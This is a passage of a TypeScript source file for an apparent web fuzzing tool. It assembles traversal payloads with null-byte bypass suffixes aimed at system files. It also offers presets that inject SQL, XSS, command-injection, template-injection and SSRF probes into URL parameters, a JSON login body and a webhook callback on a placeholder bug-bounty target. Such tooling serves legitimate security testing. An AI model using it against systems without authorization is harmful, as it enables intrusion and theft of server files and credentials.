      isValidUrl: false
    };
  }

  try {
    const hasScheme = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(trimmed);
    const parseable = hasScheme ? trimmed : `http://${trimmed}`;
    const parsed = new URL(parseable);

    const params: ParsedUrlParam[] = [];
    parsed.searchParams.forEach((value, name) => {
      params.push({ name, value });
    });

    return {
      rawUrl: trimmed,
      protocol: hasScheme ? parsed.protocol.replace(':', '') : '',
      host: parsed.host,
      pathname: parsed.pathname,
      params,
      hash: parsed.hash,
      isValidUrl: true
    };
  } catch {
    const [pathAndQuery, hashPart = ''] = trimmed.split('#');
    const [pathPart, queryPart = ''] = pathAndQuery.split('?');
    const params: ParsedUrlParam[] = [];

    if (queryPart) {
      queryPart.split('&').forEach(pair => {
        if (!pair) return;
        const [k, ...v] = pair.split('=');
        params.push({ 
          name: decodeURIComponent(k || ''), 
          value: decodeURIComponent(v.join('=') || '') 
        });
      });
    }

    return {
      rawUrl: trimmed,
      protocol: '',
      host: '',
      pathname: pathPart || '',
      params,
      hash: hashPart ? `#${hashPart}` : '',
      isValidUrl: params.length > 0 || trimmed.includes('/')
    };
  }
}

export function reconstructUrlWithParam(
  baseParsed: ParsedUrlDetails,
  targetParamName: string,
  fuzzedValue: string
): string {
  if (!baseParsed.rawUrl) return fuzzedValue;

  const [pathAndQuery, hashPart = ''] = baseParsed.rawUrl.split('#');
  const [baseUrlPath, queryPart = ''] = pathAndQuery.split('?');
  const hashSuffix = hashPart ? `#${hashPart}` : '';

  if (!targetParamName) {
    return `${baseUrlPath}?fuzz=${fuzzedValue}${hashSuffix}`;
  }

  if (!queryPart) {
    return `${baseUrlPath}?${encodeURIComponent(targetParamName)}=${fuzzedValue}${hashSuffix}`;
  }

  let paramReplaced = false;
  const queryPairs = queryPart.split('&').map(pair => {
    if (!pair) return '';
    const [k, ...v] = pair.split('=');
    const decodedKey = decodeURIComponent(k || '');
    if (decodedKey === targetParamName) {
      paramReplaced = true;
      return `${k}=${fuzzedValue}`;
    }
    return pair;
  }).filter(Boolean);

  if (!paramReplaced) {
    queryPairs.push(`${encodeURIComponent(targetParamName)}=${fuzzedValue}`);
  }

  return `${baseUrlPath}?${queryPairs.join('&')}${hashSuffix}`;
}

/**
 * Injects a mutated payload into the base string according to placement mode
 */
export function injectPayloadIntoBase(
  base: string,
  mutatedPayload: string,
  mode: PlacementMode
): string {
  if (!base) return mutatedPayload;

  const markers = ['{FUZZ}', '§FUZZ§', '§§', '{{FUZZ}}', '[FUZZ]'];
  const foundMarker = markers.find(m => base.includes(m));

  if (mode === 'MARKER' && foundMarker) {
    return base.replace(foundMarker, mutatedPayload);
  }

  if (mode === 'MARKER' && !foundMarker) {
    if (base.endsWith('=')) {
      return base + mutatedPayload;
    }
    if (base.includes('?')) {
      return base + mutatedPayload;
    }
    return base + mutatedPayload;
  }

  switch (mode) {
    case 'SUFFIX':
      return base + mutatedPayload;
    case 'PREFIX':
      return mutatedPayload + base;
    case 'REPLACE':
      return mutatedPayload;
    case 'QUOTE_WRAP':
      return `${base}' + ${mutatedPayload} + '`;
    default:
      return base + mutatedPayload;
  }
}

/**
 * Generates all fuzzed test items based on active categories, active mutations and base string
 */
export function generateFuzzItems(
  baseString: string,
  placementMode: PlacementMode,
  selectedCategories: Set<FuzzCategory>,
  selectedMutations: Set<MutationType>,
  customSeeds: FuzzSeed[] = []
): GeneratedFuzzItem[] {
  const allSeeds = [...DEFAULT_FUZZ_SEEDS, ...customSeeds];
  const activeSeeds = allSeeds.filter(s => selectedCategories.has(s.category));
  const activeMutationList = DEFAULT_MUTATION_OPTIONS.filter(m => selectedMutations.has(m.id));

  const items: GeneratedFuzzItem[] = [];

  activeSeeds.forEach(seed => {
    activeMutationList.forEach(mutation => {
      const mutatedPayload = applyMutation(seed.payload, mutation.id);
      const finalFuzzedString = injectPayloadIntoBase(baseString, mutatedPayload, placementMode);

      const categoryMeta = FUZZ_CATEGORIES.find(c => c.id === seed.category);

      items.push({
        id: `${seed.id}-${mutation.id}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
        category: seed.category,
        categoryLabel: categoryMeta?.shortLabel || seed.category,
        techniqueName: seed.name,
        originalSeed: seed.payload,
        mutationType: mutation.id,
        mutationLabel: mutation.name,
        fuzzedString: finalFuzzedString,
        length: finalFuzzedString.length,
        severity: seed.severity,
        description: seed.description,
        rawPayloadOnly: mutatedPayload
      });
    });
  });

  return items;
}

/**
 * Dedicated generator for URL Query Parameter Fuzzing
 * Handles automatic URL encoding and directory traversal character bypasses
 */
export interface UrlParamFuzzConfig {
  targetUrl: string;
  selectedParam: string;
  traversalDepths: number[]; // e.g. [3, 6, 8, 12]
  selectedTraversalEncodings: string[]; // ids from DIRECTORY_TRAVERSAL_ENCODINGS
  selectedTargetFiles: string[]; // ids from COMMON_TARGET_FILES
  includeNullByteSuffix: boolean;
  nullByteExtension: string; // e.g., '%00', '%00.png', '%00.jpg', '%2500.pdf'
  autoUrlEncodeCommonPayloads: boolean;
  selectedCategories: Set<FuzzCategory>;
  selectedMutations: Set<MutationType>;
  customSeeds: FuzzSeed[];
}

export function generateUrlParamFuzzItems(config: UrlParamFuzzConfig): GeneratedFuzzItem[] {
  const {
    targetUrl,
    selectedParam,
    traversalDepths,
    selectedTraversalEncodings,
    selectedTargetFiles,
    includeNullByteSuffix,
    nullByteExtension,
    autoUrlEncodeCommonPayloads,
    selectedCategories,
    selectedMutations,
    customSeeds
  } = config;

  const parsedUrl = parseUrlParameters(targetUrl);
  const items: GeneratedFuzzItem[] = [];

  // 1. Specialized Directory Traversal Matrix (if PATH_TRAVERSAL is selected)
  if (selectedCategories.has('PATH_TRAVERSAL')) {
    const encodingsToUse = DIRECTORY_TRAVERSAL_ENCODINGS.filter(e => 
      selectedTraversalEncodings.includes(e.id)
    );
    const filesToUse = COMMON_TARGET_FILES.filter(f => 
      selectedTargetFiles.includes(f.id)
    );

    encodingsToUse.forEach(enc => {
      traversalDepths.forEach(depth => {
        filesToUse.forEach(targetFile => {
          const depthSequence = enc.pattern.repeat(depth);
          const rawPayload = `${depthSequence}${targetFile.path}`;
          const assembledUrl = reconstructUrlWithParam(parsedUrl, selectedParam, rawPayload);

          items.push({
            id: `trav-${enc.id}-${depth}-${targetFile.id}-${Math.random().toString(36).slice(2, 6)}`,
            category: 'PATH_TRAVERSAL',
            categoryLabel: 'Traversal',
            techniqueName: `Traversal ${depth}x (${enc.badge}) -> ${targetFile.path}`,
            originalSeed: targetFile.path,
            mutationType: 'traversal_dot_slash_url',
            mutationLabel: enc.name,
            fuzzedString: assembledUrl,
            length: assembledUrl.length,
            severity: targetFile.severity,
            description: `${enc.description} Alvo: ${targetFile.description}`,
            parameterName: selectedParam,
            rawPayloadOnly: rawPayload,
            encodingApplied: enc.name
          });

          // Optional Null-Byte / Suffix Bypass
          if (includeNullByteSuffix) {
            const suffix = nullByteExtension || '%00';
            const suffixPayload = `${rawPayload}${suffix}`;
            const suffixUrl = reconstructUrlWithParam(parsedUrl, selectedParam, suffixPayload);

            items.push({
              id: `trav-null-${enc.id}-${depth}-${targetFile.id}-${Math.random().toString(36).slice(2, 6)}`,
              category: 'PATH_TRAVERSAL',
              categoryLabel: 'Traversal',
              techniqueName: `Null-Byte Suffix (${enc.badge} + ${suffix}) -> ${targetFile.path}`,
              originalSeed: targetFile.path,
              mutationType: 'null_byte',
              mutationLabel: `Null Byte Bypass (${suffix})`,
              fuzzedString: suffixUrl,
              length: suffixUrl.length,
              severity: 'CRITICAL',
              description: `Bypass de extensão ou terminação de string com caractere nulo (${suffix}) para ${targetFile.name}.`,
              parameterName: selectedParam,
              rawPayloadOnly: suffixPayload,
              encodingApplied: `${enc.name} + Null Byte (${suffix})`
            });
          }
        });
      });
    });
  }

  // 2. Standard Category Seeds with Automatic URL Encoding for URL parameters
  const allSeeds = [...DEFAULT_FUZZ_SEEDS, ...customSeeds];
  const activeSeeds = allSeeds.filter(s => {
    // If PATH_TRAVERSAL, only include seeds that are not pure repetitive traversal (e.g. PHP wrappers, absolute paths)
    if (s.category === 'PATH_TRAVERSAL') {
      return s.id === 'lfi-4' || s.id === 'lfi-12' || s.id.startsWith('custom-');
    }
    return selectedCategories.has(s.category);
  });

  const activeMutationList = DEFAULT_MUTATION_OPTIONS.filter(m => selectedMutations.has(m.id));

  activeSeeds.forEach(seed => {
    activeMutationList.forEach(mutation => {
      let mutatedPayload = applyMutation(seed.payload, mutation.id);

      // Automatic URL Encoding for common payloads when targeting URL query parameters
      let appliedLabel = mutation.name;
      if (autoUrlEncodeCommonPayloads && mutation.id === 'raw') {
        mutatedPayload = encodeURIComponent(seed.payload);
        appliedLabel = 'Auto URL Encoded';
      }

      const assembledUrl = reconstructUrlWithParam(parsedUrl, selectedParam, mutatedPayload);
      const categoryMeta = FUZZ_CATEGORIES.find(c => c.id === seed.category);

      items.push({
        id: `url-param-${seed.id}-${mutation.id}-${Math.random().toString(36).slice(2, 6)}`,
        category: seed.category,
        categoryLabel: categoryMeta?.shortLabel || seed.category,
        techniqueName: seed.name,
        originalSeed: seed.payload,
        mutationType: mutation.id,
        mutationLabel: appliedLabel,
        fuzzedString: assembledUrl,
        length: assembledUrl.length,
        severity: seed.severity,
        description: seed.description,
        parameterName: selectedParam,
        rawPayloadOnly: mutatedPayload,
        encodingApplied: appliedLabel
      });
    });
  });

  return items;
}

/**
 * Quick presets for real-world application testing
 */
export const FUZZ_PRESETS = [
  {
    id: 'preset-url-param',
    name: 'URL Query Parameter',
    base: 'https://alvo-bugbounty.com/api/v1/search?q={FUZZ}&limit=10',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'XSS', 'COMMAND_INJECTION', 'SSTI'] as FuzzCategory[],
    description: 'Injeta no parâmetro "q" de busca em requisições GET HTTP.'
  },
  {
    id: 'preset-json-auth',
    name: 'JSON Auth & Body',
    base: '{"username": "admin", "password": "{FUZZ}", "remember": true}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'NOSQL_LDAP', 'COMMAND_INJECTION'] as FuzzCategory[],
    description: 'Injeção dentro de credenciais em APIs REST / JSON.'
  },
  {
    id: 'preset-file-download',
    name: 'File Path / LFI Download',
    base: 'https://alvo-bugbounty.com/download.php?file={FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['PATH_TRAVERSAL', 'COMMAND_INJECTION'] as FuzzCategory[],
    description: 'Exploração de leitura arbitrária de arquivos de sistema e LFI.'
  },
  {
    id: 'preset-ssrf-webhook',
    name: 'Webhook & Callback SSRF',
    base: 'https://alvo-bugbounty.com/api/integrations/webhook?callback_url={FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SSRF'] as FuzzCategory[],
    description: 'Auditoria de requisições do lado do servidor contra metadados de nuvem.'
  },
  {
    id: 'preset-raw-polyglot',
    name: 'Raw Injection String (No Wrapper)',
    base: '{FUZZ}',
    mode: 'MARKER' as PlacementMode,
    categories: ['SQLI', 'XSS', 'PATH_TRAVERSAL', 'COMMAND_INJECTION', 'SSTI'] as FuzzCategory[],
    description: 'Gera strings puras para colar no Burp Intruder ou terminais de teste manual.'
  }
];
